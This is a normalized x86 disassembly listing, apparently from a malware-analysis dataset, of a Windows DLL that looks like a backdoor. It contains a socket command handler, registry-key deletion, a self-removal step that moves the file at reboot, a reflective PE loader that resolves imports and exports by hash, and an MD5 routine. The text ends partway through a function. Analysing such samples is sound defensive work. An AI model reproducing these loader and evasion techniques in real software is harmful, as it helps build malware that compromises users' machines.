cmp edi 0x6
jne r-xdata
push esi
push sub_100065bf
jmp r-xdata
cmp edi 0x4
jne r-xdata
push esi
push sub_10009230
jmp r-xdata
call sub_1000714d
pop ecx
pop ecx
call sub_1001265d
xor eax eax
inc eax
pop esi
retn
push esi
push sub_10008ab4
sub_10003fe7
push ebp
mov ebp esp
sub esp 0x638
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
push ebx
push esi
push edi
mov edi ecx
push edi
mov [ ebp - 0x628 ] 0x1
call sub_1001265d
add esp 0x4
xor eax eax
mov esi 0x206
push esi
mov [ ebp - 0x214 ] ax
xor ebx ebx
lea eax [ ebp - 0x212 ]
push ebx
push eax
call sub_1000b660
add esp 0xc
lea eax [ ebp - 0x214 ]
push eax
push r--data
push edi
call sub_1000b2fd
add esp 0xc
lea eax [ ebp - 0x630 ]
push eax
push edi
mov [ ebp - 0x630 ] ebx
call [ CommandLineToArgvW@IAT ]
mov [ ebp - 0x62c ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x638 ] eax
lea eax [ ebp - 0x214 ]
push r--data
push eax
mov [ ebp - 0x634 ] edi
call sub_1000b17d
pop ecx
pop ecx
test eax eax
jne r-xdata
lea eax [ ebp - 0x214 ]
push r--data
push eax
call sub_1000b17d
pop ecx
pop ecx
test eax eax
je r-xdata
push rw-data
push r--data
push [ ebp + 0x8 ]
call sub_10006e8e
jmp r-xdata
push r--data
push [ ebp + 0x8 ]
call sub_10006e8e
push r--data
push [ ebp + 0x8 ]
call sub_10006e8e
add esp 0x10
lea eax [ ebp - 0x214 ]
push r--data
push eax
call sub_1000b17d
pop ecx
pop ecx
test eax eax
je r-xdata
add esp 0xc
lea eax [ ebp - 0x214 ]
push r--data
push eax
call sub_1000b17d
pop ecx
pop ecx
test eax eax
jne r-xdata
lea eax [ ebp - 0x214 ]
push r--data
push eax
call sub_1000b17d
pop ecx
pop ecx
test eax eax
jne r-xdata
push [ ebp + 0x8 ]
call sub_100074b5
jmp r-xdata
lea eax [ ebp - 0x214 ]
push r--data
push eax
call sub_1000b17d
pop ecx
pop ecx
test eax eax
jne r-xdata
lea eax [ ebp - 0x638 ]
call sub_1000129b
jmp r-xdata
pop ecx
jmp r-xdata
lea eax [ ebp - 0x214 ]
push r--data
push eax
call sub_1000b17d
pop ecx
pop ecx
test eax eax
jne r-xdata
push [ ebp + 0x8 ]
xor edi edi
inc edi
jmp r-xdata
push rw-data
push r--data
push [ ebp + 0x8 ]
call sub_10006e8e
mov eax [ ebp - 0x628 ]
lea eax [ ebp - 0x214 ]
push r--data
push eax
call sub_1000b17d
pop ecx
pop ecx
test eax eax
jne r-xdata
push [ ebp + 0x8 ]
push 0x6
jmp r-xdata
call sub_10003f77
lea eax [ ebp - 0x214 ]
push r--data
push eax
call sub_1000b17d
pop ecx
pop ecx
test eax eax
jne r-xdata
push [ ebp + 0x8 ]
push 0x4
pop edi
lea eax [ ebp - 0x214 ]
push r--data
push eax
call sub_1000b17d
pop ecx
pop ecx
test eax eax
jne r-xdata
mov [ ebp - 0x628 ] ebx
mov [ rw-data ] ebx
jmp r-xdata
lea eax [ ebp - 0x214 ]
push r--data
push eax
call sub_1000b17d
pop ecx
pop ecx
test eax eax
jne r-xdata
mov eax [ ebp - 0x62c ]
push [ eax + 0x4 ]
call sub_1000b382
imul eax eax 0x3e8
cmp eax ebx
pop ecx
mov [ rw-data ] eax
jg r-xdata
lea eax [ ebp - 0x214 ]
push r--data
push eax
call sub_1000b17d
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ ebp - 0x630 ] 0x2
je r-xdata
push eax
call sub_1001265d
add esp 0x4
xor eax eax
jmp r-xdata
mov eax 0x2710
mov [ rw-data ] eax
lea eax [ ebp - 0x214 ]
push eax
push r--data
push [ ebp + 0x8 ]
call sub_10006e8e
add esp 0xc
jmp r-xdata
push esi
mov [ ebp - 0x624 ] ax
lea eax [ ebp - 0x622 ]
push ebx
push eax
call sub_1000b660
add esp 0xc
mov edi rw-data
call sub_10007215
push 0x208
lea eax [ ebp - 0x624 ]
push ebx
push eax
call sub_1000b660
add esp 0xc
push r--data
lea eax [ ebp - 0x624 ]
push r--data
push eax
call [ wsprintfW@IAT ]
add esp 0xc
lea eax [ ebp - 0x624 ]
push eax
push 0x80000002
call [ SHDeleteKeyW@IAT ]
mov edi rw-data
call sub_10007215
test al al
jne r-xdata
mov edi [ ebp - 0x62c ]
push [ edi + 0x4 ]
call sub_1001265d
add esp 0x4
xor eax eax
push esi
mov [ ebp - 0x41c ] ax
lea eax [ ebp - 0x41a ]
push ebx
push eax
call sub_1000b660
add esp 0xc
lea eax [ ebp - 0x41c ]
push r--data
push eax
call sub_10001000
lea eax [ ebp - 0x41c ]
push r--data
push eax
call sub_1000b31f
lea eax [ ebp - 0x41c ]
push r--data
push eax
call sub_1000b31f
push [ edi + 0x4 ]
lea eax [ ebp - 0x41c ]
push eax
call sub_1000b31f
lea eax [ ebp - 0x41c ]
push r--data
push eax
call sub_1000b31f
lea eax [ ebp - 0x41c ]
push eax
call sub_10003267
add esp 0x2c
jmp r-xdata
push r--data
push [ ebp + 0x8 ]
call sub_10006e8e
pop ecx
pop ecx
jmp r-xdata
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000ac69
leave
retn
mov edi r--data
call sub_10007215
mov [ ebp - 0x628 ] ebx
mov [ rw-data ] ebx
call sub_1001265d
jmp r-xdata
xor eax eax
push esi
mov [ ebp - 0x41c ] ax
lea eax [ ebp - 0x41a ]
push ebx
push eax
call sub_1000b660
add esp 0xc
call [ GetTickCount@IAT ]
push eax
push rw-data
lea eax [ ebp - 0x41c ]
push r--data
push eax
call [ wsprintfW@IAT ]
lea eax [ ebp - 0x41c ]
push eax
call sub_1001265d
add esp 0x14
push eax
push edi
call [ MoveFileW@IAT ]
push 0x4
push ebx
lea eax [ ebp - 0x41c ]
push eax
call [ MoveFileExW@IAT ]
sub_1000442e
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push 0x10
pop esi
push esi
lea eax [ ebp - 0x34 ]
push 0x0
push eax
call sub_1000b660
add esp 0xc
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x44 ]
push eax
push [ ebp + 0x8 ]
mov [ ebp - 0x4c ] esi
call [ getpeername@IAT ]
cmp eax 0xffffffff
jne r-xdata
push ebx
push [ ebp - 0x40 ]
call [ inet_ntoa@IAT ]
push eax
lea eax [ ebp - 0x24 ]
push r--data
push eax
call sub_1000b210
add esp 0xc
push [ ebp - 0x42 ]
call [ ntohs@IAT ]
movzx eax ax
push eax
lea ebx [ ebp - 0x24 ]
call sub_10006ca3
mov esi eax
pop ecx
pop ebx
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
push [ ebp + 0x8 ]
call sub_100069fc
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_1000ac69
leave
retn
mov al [ eax + 0xc ]
mov [ ebp - 0x48 ] al
push [ ebp - 0x48 ]
push [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
call sub_10003d74
add esp 0x10
neg eax
sbb eax eax
and eax esi
sub_100044de
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0xb64
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0xb60 ] eax
push ebx
push esi
push edi
mov edi [ rw-data ]
push 0x104
lea eax [ esp + 0x14 ]
push eax
call [ gethostname@IAT ]
push 0x0
lea eax [ esp + 0x14 ]
push eax
push 0x400
lea ebx [ esp + 0x374 ]
call sub_10008171
add esp 0xc
push eax
mov esi rw-data
push esi
call sub_1000b34d
push esi
push r--data
push edi
call sub_10006e8e
add esp 0x14
push 0x1
call [ SetErrorMode@IAT ]
push 0x1b58
push 0x7530
push edi
call sub_10006eea
add esp 0xc
mov ebx 0x250
jmp r-xdata
push ebx
push edi
lea esi [ esp + 0x120 ]
call sub_10003ee4
pop ecx
pop ecx
test eax eax
jne r-xdata
push edi
lea ecx [ esp + 0x11c ]
call sub_10003fe7
pop ecx
test eax eax
je r-xdata
push edi
call sub_1000696e
call sub_1001265d
push 0x2
push edi
call [ shutdown@IAT ]
push edi
call sub_10006b18
pop ecx
mov ecx [ esp + 0xb6c ]
pop edi
pop esi
xor eax eax
pop ebx
xor ecx esp
inc eax
call sub_1000ac69
mov esp ebp
pop ebp
retn
sub_100045c2
mov eax [ rw-data ]
test eax eax
je r-xdata
retn
push esi
xor esi esi
test eax eax
jle r-xdata
and [ rw-data ] 0x0
pop esi
mov eax [ rw-data ]
push edi
mov edi [ eax + 0x4 ]
push eax
call sub_1000b6da
inc esi
cmp esi [ rw-data ]
mov eax edi
pop ecx
mov [ rw-data ] eax
jl r-xdata
pop edi
sub_10004616
push esi
push 0x0
push 0x80
push 0x3
push 0x0
push 0x1
push 0x80000000
push [ esp + 0x20 ]
mov esi ecx
call [ CreateFileW@IAT ]
mov [ esi + 0x8 ] eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
push eax
call [ GetFileSize@IAT ]
mov [ esi + 0x4 ] eax
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0x10 ]
push [ esi + 0x8 ]
call [ CloseHandle@IAT ]
jmp r-xdata
pop esi
retn 0x4
sub_10004667
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ VirtualAlloc@IAT ]
push 0x40
mov ebx 0x1000
push ebx
mov esi ecx
push [ esi + 0x4 ]
push 0x0
call edi
mov [ esi + 0xc ] eax
test eax eax
jne r-xdata
and [ ebp - 0x4 ] 0x0
push 0x0
lea ecx [ ebp - 0x4 ]
push ecx
push [ esi + 0x4 ]
push eax
push [ esi + 0x8 ]
call [ ReadFile@IAT ]
push [ esi + 0x8 ]
call [ CloseHandle@IAT ]
mov ecx [ esi + 0xc ]
mov eax 0x5a4d
cmp [ ecx ] ax
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ecx + 0x3c ]
add eax ecx
cmp [ eax ] 0x4550
jne r-xdata
push 0x8000
push 0x0
push ecx
call [ VirtualFree@IAT ]
and [ esi + 0xc ] 0x0
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ eax + 0x50 ]
push 0x40
push ebx
push eax
xor ebx ebx
push ebx
call edi
mov [ esi + 0x10 ] eax
cmp eax ebx
jne r-xdata
mov edx [ esi ]
push eax
push [ esi + 0xc ]
mov ecx esi
call [ edx + 0x14 ]
push 0x8000
push ebx
push [ esi + 0xc ]
call [ VirtualFree@IAT ]
push [ esi + 0x10 ]
mov eax [ esi ]
mov ecx esi
call [ eax + 0x18 ]
push [ esi + 0x10 ]
mov eax [ esi ]
mov ecx esi
call [ eax + 0x1c ]
mov eax [ esi ]
mov ecx esi
call [ eax + 0x20 ]
xor eax eax
inc eax
push 0x8000
push ebx
push [ esi + 0xc ]
call [ VirtualFree@IAT ]
mov [ esi + 0xc ] ebx
jmp r-xdata
sub_10004745
push ebx
push esi
push edi
mov edi [ esp + 0x10 ]
mov eax [ edi + 0x3c ]
add eax edi
push [ eax + 0x54 ]
movzx ecx [ eax + 0x14 ]
movzx ebx [ eax + 0x6 ]
push edi
push [ esp + 0x1c ]
lea esi [ ecx + eax + 0x18 ]
call sub_1000ac80
add esp 0xc
test ebx ebx
jle r-xdata
pop edi
pop esi
pop ebx
retn 0x8
add esi 0x14
push [ esi - 0x4 ]
mov eax [ esi ]
add eax edi
push eax
mov eax [ esi - 0x8 ]
add eax [ esp + 0x1c ]
push eax
call sub_1000ac80
add esp 0xc
add esi 0x28
dec ebx
jne r-xdata
sub_10004798
push ecx
push ecx
push ebx
push ebp
mov ebp [ esp + 0x14 ]
mov eax [ ebp + 0x3c ]
push edi
mov edi [ eax + ebp + 0x80 ]
add edi ebp
xor ebx ebx
cmp [ edi + 0x10 ] ebx
je r-xdata
pop edi
pop ebp
pop ebx
pop ecx
pop ecx
retn 0x4
push esi
pop esi
add eax ebp
push eax
call [ GetModuleHandleA@IAT ]
mov [ esp + 0x1c ] eax
cmp eax ebx
jne r-xdata
mov eax [ edi ]
cmp eax ebx
je r-xdata
mov eax [ edi + 0xc ]
add eax ebp
push eax
call [ LoadLibraryA@IAT ]
mov [ esp + 0x1c ] eax
mov eax [ edi + 0x10 ]
add eax ebp
mov [ esp + 0x14 ] eax
add eax ebp
mov [ esp + 0x14 ] eax
jmp r-xdata
add edi 0x14
xor ebx ebx
cmp [ edi + 0x10 ] ebx
jne r-xdata
mov eax [ eax ]
test eax eax
jns r-xdata
mov esi [ edi + 0x10 ]
add esi ebp
mov [ esp + 0x10 ] ebx
cmp [ eax ] ebx
je r-xdata
mov eax [ edi + 0xc ]
cmp eax ebx
je r-xdata
add eax ebp
add eax 0x2
and eax 0x7fffffff
jmp r-xdata
push eax
push [ esp + 0x20 ]
call [ GetProcAddress@IAT ]
inc [ esp + 0x10 ]
mov [ ebx + esi ] eax
mov ebx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
shl ebx 0x2
add eax ebx
cmp [ eax ] 0x0
jne r-xdata
sub_10004856
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x3c ]
lea edx [ eax + esi + 0x18 ]
mov eax [ edx + 0x88 ]
add eax esi
cmp [ eax ] 0x0
je r-xdata
pop esi
pop ebp
retn 0x4
push ebx
push edi
pop edi
pop ebx
add ecx 0xfffffff8
shr ecx 0x1
test ecx ecx
jle r-xdata
add eax [ eax + 0x4 ]
cmp [ eax ] 0x0
jne r-xdata
lea edi [ eax + 0x8 ]
mov [ ebp + 0x8 ] ecx
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
inc edi
inc edi
dec [ ebp + 0x8 ]
jne r-xdata
and ecx 0xfff
add ecx [ eax ]
mov ebx esi
sub ebx [ edx + 0x1c ]
add ecx esi
add [ ecx ] ebx
movzx ecx [ edi ]
test cx cx
je r-xdata
sub_100048b8
push ebp
mov ebp esp
sub esp 0x10
mov ecx [ ecx + 0x10 ]
mov eax [ ecx + 0x3c ]
mov eax [ eax + ecx + 0x78 ]
and [ ebp - 0x4 ] 0x0
push ebx
add eax ecx
mov edx [ eax + 0x20 ]
mov ebx [ eax + 0x1c ]
push esi
push edi
mov edi [ eax + 0x24 ]
mov eax [ eax + 0x18 ]
add edx ecx
add edi ecx
add ebx ecx
mov [ ebp - 0x10 ] eax
test eax eax
jbe r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
mov esi [ edx + eax * 4 ]
and [ ebp - 0xc ] 0x0
add esi ecx
mov al [ esi ]
test al al
je r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0x8 ]
je r-xdata
mov [ ebp - 0x8 ] esi
mov eax [ ebp - 0x4 ]
movzx eax [ edi + eax * 2 ]
mov eax [ ebx + eax * 4 ]
add eax ecx
jmp r-xdata
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x10 ]
jb r-xdata
mov esi [ ebp - 0xc ]
movsx eax al
ror esi 0x7
add esi eax
inc [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
mov al [ eax ]
mov [ ebp - 0xc ] esi
test al al
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x4
sub_10004947
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x3c ]
mov eax [ eax + esi + 0x78 ]
and [ ebp + 0x8 ] 0x0
add eax esi
mov edx [ eax + 0x20 ]
mov ebx [ eax + 0x1c ]
push edi
mov edi [ eax + 0x24 ]
mov eax [ eax + 0x18 ]
add edx esi
add edi esi
add ebx esi
mov [ ebp - 0xc ] eax
test eax eax
jbe r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
mov ecx [ edx + eax * 4 ]
and [ ebp - 0x8 ] 0x0
add ecx esi
mov al [ ecx ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp + 0xc ]
je r-xdata
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
movzx eax [ edi + eax * 2 ]
mov eax [ ebx + eax * 4 ]
add eax esi
jmp r-xdata
inc [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp eax [ ebp - 0xc ]
jb r-xdata
mov ecx [ ebp - 0x8 ]
movsx eax al
ror ecx 0x7
add ecx eax
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov al [ eax ]
mov [ ebp - 0x8 ] ecx
test al al
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_100049f6
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov ecx [ esi + 0x10 ]
mov ebx eax
mov eax ecx
shr eax 0x3
mov edx ebx
lea ecx [ ecx + ebx * 8 ]
shl edx 0x3
and eax 0x3f
push edi
mov [ esi + 0x10 ] ecx
cmp ecx edx
jae r-xdata
push 0x40
mov ecx ebx
shr ecx 0x1d
add [ esi + 0x14 ] ecx
pop edi
sub edi eax
cmp ebx edi
jb r-xdata
inc [ esi + 0x14 ]
xor edi edi
xor ecx ecx
test edi edi
jbe r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x4
mov edx [ ebp + 0x8 ]
add edx edi
lea esi [ eax + esi + 0x18 ]
lea ecx [ esi + 0x18 ]
push esi
call sub_10004b12
lea eax [ edi + 0x3f ]
cmp eax ebx
jae r-xdata
lea eax [ eax + esi + 0x18 ]
mov al [ edx + ecx ]
mov [ esi + ecx ] al
inc ecx
cmp ecx ebx
jb r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0x8 ]
mov dl [ ecx + edx ]
mov [ eax + ecx ] dl
inc ecx
cmp ecx edi
jb r-xdata
xor ecx ecx
sub ebx edi
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
lea ecx [ eax + ecx - 0x3f ]
push esi
call sub_10004b12
add [ ebp - 0x4 ] 0x40
add edi 0x40
cmp [ ebp - 0x4 ] ebx
jb r-xdata
sub_10004a9d
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push 0x8
lea esi [ edi + 0x10 ]
pop edx
mov eax esi
lea ecx [ ebp - 0xc ]
call sub_100051ad
mov ecx [ esi ]
shr ecx 0x3
push 0x38
pop eax
and ecx 0x3f
pop esi
cmp ecx eax
jb r-xdata
sub eax ecx
push rw-data
mov ecx edi
call sub_100049f6
lea eax [ ebp - 0xc ]
push eax
push 0x8
pop eax
mov ecx edi
call sub_100049f6
push 0x10
pop edx
mov eax edi
mov ecx ebx
call sub_100051ad
push 0x58
push 0x0
push edi
call sub_1000b660
mov ecx [ ebp - 0x4 ]
xor ecx ebp
add esp 0xc
call sub_1000ac69
leave
retn
push 0x78
pop eax
sub_10004b12
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
sub esp 0x48
push ebx
push esi
push edi
push 0x10
add ecx 0x2
lea edx [ ebp - 0x48 ]
pop esi
movzx edi [ ecx + 0x1 ]
movzx ebx [ ecx ]
shl edi 0x8
or edi ebx
movzx ebx [ ecx - 0x1 ]
shl edi 0x8
or edi ebx
movzx ebx [ ecx - 0x2 ]
shl edi 0x8
or edi ebx
mov [ edx ] edi
add edx 0x4
add ecx 0x4
dec esi
jne r-xdata
mov esi [ eax + 0x4 ]
mov edx [ eax + 0x8 ]
mov ecx [ eax + 0xc ]
mov eax [ eax ]
mov edi esi
not edi
and edi ecx
mov ebx edx
and ebx esi
or edi ebx
add edi [ ebp - 0x48 ]
mov ebx esi
lea eax [ edi + eax - 0x28955b88 ]
rol eax 0x7
add eax esi
and ebx eax
mov edi eax
not edi
and edi edx
or edi ebx
add edi [ ebp - 0x44 ]
lea ecx [ edi + ecx - 0x173848aa ]
rol ecx 0xc
add ecx eax
mov edi ecx
not edi
and edi esi
mov ebx ecx
and ebx eax
or edi ebx
add edi [ ebp - 0x40 ]
mov ebx ecx
lea edx [ edi + edx + 0x242070db ]
ror edx 0xf
add edx ecx
and ebx edx
mov edi edx
not edi
and edi eax
or edi ebx
add edi [ ebp - 0x3c ]
lea esi [ edi + esi - 0x3e423112 ]
ror esi 0xa
add esi edx
mov [ ebp - 0x4 ] esi
mov edi edx
and edi [ ebp - 0x4 ]
not esi
and esi ecx
or esi edi
add esi [ ebp - 0x38 ]
lea eax [ esi + eax - 0xa83f051 ]
mov esi [ ebp - 0x4 ]
rol eax 0x7
add eax esi
mov edi eax
not edi
and edi edx
mov ebx esi
and ebx eax
or edi ebx
add edi [ ebp - 0x34 ]
lea ecx [ edi + ecx + 0x4787c62a ]
rol ecx 0xc
add ecx eax
mov edi ecx
not edi
and edi esi
mov ebx ecx
and ebx eax
or edi ebx
add edi [ ebp - 0x30 ]
mov ebx ecx
lea edx [ edi + edx - 0x57cfb9ed ]
ror edx 0xf
add edx ecx
mov edi edx
not edi
and edi eax
and ebx edx
or edi ebx
add edi [ ebp - 0x2c ]
lea esi [ edi + esi - 0x2b96aff ]
ror esi 0xa
add esi edx
mov [ ebp - 0x4 ] esi
not esi
and esi ecx
mov edi edx
and edi [ ebp - 0x4 ]
or esi edi
add esi [ ebp - 0x28 ]
lea eax [ esi + eax + 0x698098d8 ]
mov esi [ ebp - 0x4 ]
mov ebx esi
rol eax 0x7
add eax esi
and ebx eax
mov edi eax
not edi
and edi edx
or edi ebx
add edi [ ebp - 0x24 ]
lea ecx [ edi + ecx - 0x74bb0851 ]
rol ecx 0xc
add ecx eax
mov edi ecx
not edi
and edi esi
mov ebx ecx
and ebx eax
or edi ebx
add edi [ ebp - 0x20 ]
mov ebx ecx
lea edx [ edi + edx - 0xa44f ]
ror edx 0xf
add edx ecx
and ebx edx
mov edi edx
not edi
and edi eax
or edi ebx
add edi [ ebp - 0x1c ]
lea esi [ edi + esi - 0x76a32842 ]
ror esi 0xa
add esi edx
mov [ ebp - 0x4 ] esi
not esi
and esi ecx
mov edi edx
and edi [ ebp - 0x4 ]
or esi edi
add esi [ ebp - 0x18 ]
mov edi [ ebp - 0x4 ]
lea eax [ esi + eax + 0x6b901122 ]
rol eax 0x7
add eax [ ebp - 0x4 ]
and edi eax
mov esi eax
not esi
and esi edx
or esi edi
add esi [ ebp - 0x14 ]
lea ecx [ esi + ecx - 0x2678e6d ]
rol ecx 0xc
add ecx eax
mov edi ecx
not edi
mov esi edi
and esi [ ebp - 0x4 ]
mov ebx ecx
and ebx eax
or esi ebx
add esi [ ebp - 0x10 ]
mov ebx ecx
lea edx [ esi + edx - 0x5986bc72 ]
ror edx 0xf
add edx ecx
mov [ ebp - 0x8 ] edx
not [ ebp - 0x8 ]
mov esi [ ebp - 0x8 ]
and esi eax
and edi edx
and ebx edx
or esi ebx
add esi [ ebp - 0xc ]
mov ebx [ ebp - 0x4 ]
lea esi [ esi + ebx + 0x49b40821 ]
ror esi 0xa
add esi edx
mov ebx ecx
and ebx esi
or edi ebx
add edi [ ebp - 0x44 ]
mov ebx edx
lea eax [ edi + eax - 0x9e1da9e ]
mov edi [ ebp - 0x8 ]
and edi esi
rol eax 0x5
add eax esi
and ebx eax
or edi ebx
add edi [ ebp - 0x30 ]
lea ecx [ edi + ecx - 0x3fbf4cc0 ]
rol ecx 0x9
add ecx eax
mov edi esi
not edi
and edi eax
mov ebx ecx
and ebx esi
or edi ebx
add edi [ ebp - 0x1c ]
lea edx [ edi + edx + 0x265e5a51 ]
rol edx 0xe
add edx ecx
mov edi eax
not edi
and edi ecx
mov ebx edx
and ebx eax
or edi ebx
add edi [ ebp - 0x48 ]
mov ebx ecx
lea esi [ edi + esi - 0x16493856 ]
ror esi 0xc
add esi edx
and ebx esi
mov edi ecx
not edi
and edi edx
or edi ebx
add edi [ ebp - 0x34 ]
mov ebx edx
lea eax [ edi + eax - 0x29d0efa3 ]
rol eax 0x5
add eax esi
mov edi edx
not edi
and edi esi
and ebx eax
or edi ebx
add edi [ ebp - 0x20 ]
lea ecx [ edi + ecx + 0x2441453 ]
rol ecx 0x9
add ecx eax
mov edi esi
not edi
and edi eax
mov ebx ecx
and ebx esi
or edi ebx
add edi [ ebp - 0xc ]
lea edx [ edi + edx - 0x275e197f ]
rol edx 0xe
add edx ecx
mov edi eax
not edi
mov ebx edx
and edi ecx
and ebx eax
or edi ebx
add edi [ ebp - 0x38 ]
lea esi [ edi + esi - 0x182c0438 ]
ror esi 0xc
add esi edx
mov edi ecx
not edi
and edi edx
mov ebx ecx
and ebx esi
or edi ebx
add edi [ ebp - 0x24 ]
mov ebx edx
lea eax [ edi + eax + 0x21e1cde6 ]
rol eax 0x5
add eax esi
and ebx eax
mov edi edx
not edi
and edi esi
or edi ebx
add edi [ ebp - 0x10 ]
lea ecx [ edi + ecx - 0x3cc8f82a ]
rol ecx 0x9
add ecx eax
mov edi esi
not edi
and edi eax
mov ebx ecx
and ebx esi
or edi ebx
add edi [ ebp - 0x3c ]
lea edx [ edi + edx - 0xb2af279 ]
rol edx 0xe
add edx ecx
mov edi eax
not edi
and edi ecx
mov ebx edx
and ebx eax
or edi ebx
add edi [ ebp - 0x28 ]
mov ebx ecx
lea esi [ edi + esi + 0x455a14ed ]
ror esi 0xc
add esi edx
and ebx esi
mov edi ecx
not edi
and edi edx
or edi ebx
add edi [ ebp - 0x14 ]
mov ebx edx
lea eax [ edi + eax - 0x561c16fb ]
rol eax 0x5
add eax esi
mov edi edx
not edi
and edi esi
and ebx eax
or edi ebx
add edi [ ebp - 0x40 ]
lea ecx [ edi + ecx - 0x3105c08 ]
rol ecx 0x9
add ecx eax
mov edi esi
not edi
and edi eax
mov ebx ecx
and ebx esi
or edi ebx
add edi [ ebp - 0x2c ]
lea edx [ edi + edx + 0x676f02d9 ]
rol edx 0xe
add edx ecx
mov edi eax
not edi
mov ebx edx
and edi ecx
and ebx eax
or edi ebx
add edi [ ebp - 0x18 ]
lea esi [ edi + esi - 0x72d5b376 ]
ror esi 0xc
add esi edx
mov edi ecx
xor edi edx
xor edi esi
add edi [ ebp - 0x34 ]
lea eax [ edi + eax - 0x5c6be ]
rol eax 0x4
add eax esi
mov edi edx
xor edi esi
xor edi eax
add edi [ ebp - 0x28 ]
lea ecx [ edi + ecx - 0x788e097f ]
rol ecx 0xb
add ecx eax
mov edi ecx
xor edi esi
xor edi eax
add edi [ ebp - 0x1c ]
lea edx [ edi + edx + 0x6d9d6122 ]
rol edx 0x10
add edx ecx
mov edi ecx
xor edi edx
mov ebx edi
xor ebx eax
add ebx [ ebp - 0x10 ]
lea esi [ ebx + esi - 0x21ac7f4 ]
ror esi 0x9
add esi edx
xor edi esi
add edi [ ebp - 0x44 ]
lea eax [ edi + eax - 0x5b4115bc ]
rol eax 0x4
add eax esi
mov edi edx
xor edi esi
xor edi eax
add edi [ ebp - 0x38 ]
lea edi [ edi + ecx + 0x4bdecfa9 ]
rol edi 0xb
add edi eax
mov ecx edi
xor ecx esi
xor ecx eax
add ecx [ ebp - 0x2c ]
mov ebx edi
lea edx [ ecx + edx - 0x944b4a0 ]
rol edx 0x10
add edx edi
xor ebx edx
mov ecx ebx
xor ecx eax
add ecx [ ebp - 0x20 ]
lea ecx [ ecx + esi - 0x41404390 ]
ror ecx 0x9
add ecx edx
xor ebx ecx
add ebx [ ebp - 0x14 ]
mov esi edx
lea eax [ ebx + eax + 0x289b7ec6 ]
xor esi ecx
rol eax 0x4
add eax ecx
xor esi eax
add esi [ ebp - 0x48 ]
lea esi [ esi + edi - 0x155ed806 ]
rol esi 0xb
add esi eax
mov edi esi
xor edi ecx
xor edi eax
add edi [ ebp - 0x3c ]
lea edi [ edi + edx - 0x2b10cf7b ]
rol edi 0x10
add edi esi
mov edx esi
xor edx edi
mov ebx edx
xor ebx eax
add ebx [ ebp - 0x30 ]
lea ecx [ ebx + ecx + 0x4881d05 ]
ror ecx 0x9
add ecx edi
xor edx ecx
add edx [ ebp - 0x24 ]
lea eax [ edx + eax - 0x262b2fc7 ]
mov edx edi
xor edx ecx
rol eax 0x4
add eax ecx
xor edx eax
add edx [ ebp - 0x18 ]
lea edx [ edx + esi - 0x1924661b ]
rol edx 0xb
add edx eax
mov esi edx
xor esi ecx
xor esi eax
add esi [ ebp - 0xc ]
lea esi [ esi + edi + 0x1fa27cf8 ]
rol esi 0x10
add esi edx
mov edi edx
xor edi esi
xor edi eax
add edi [ ebp - 0x40 ]
lea ecx [ edi + ecx - 0x3b53a99b ]
ror ecx 0x9
add ecx esi
mov edi edx
not edi
or edi ecx
xor edi esi
add edi [ ebp - 0x48 ]
lea eax [ edi + eax - 0xbd6ddbc ]
rol eax 0x6
add eax ecx
mov edi esi
not edi
or edi eax
xor edi ecx
add edi [ ebp - 0x2c ]
lea edx [ edi + edx + 0x432aff97 ]
rol edx 0xa
add edx eax
mov edi ecx
not edi
or edi edx
xor edi eax
add edi [ ebp - 0x10 ]
lea esi [ edi + esi - 0x546bdc59 ]
rol esi 0xf
add esi edx
mov edi eax
not edi
or edi esi
xor edi edx
add edi [ ebp - 0x34 ]
lea ecx [ edi + ecx - 0x36c5fc7 ]
ror ecx 0xb
add ecx esi
mov edi edx
not edi
or edi ecx
xor edi esi
add edi [ ebp - 0x18 ]
lea eax [ edi + eax + 0x655b59c3 ]
rol eax 0x6
add eax ecx
mov edi esi
not edi
or edi eax
xor edi ecx
add edi [ ebp - 0x3c ]
lea edx [ edi + edx - 0x70f3336e ]
rol edx 0xa
mov edi ecx
add edx eax
not edi
or edi edx
xor edi eax
add edi [ ebp - 0x20 ]
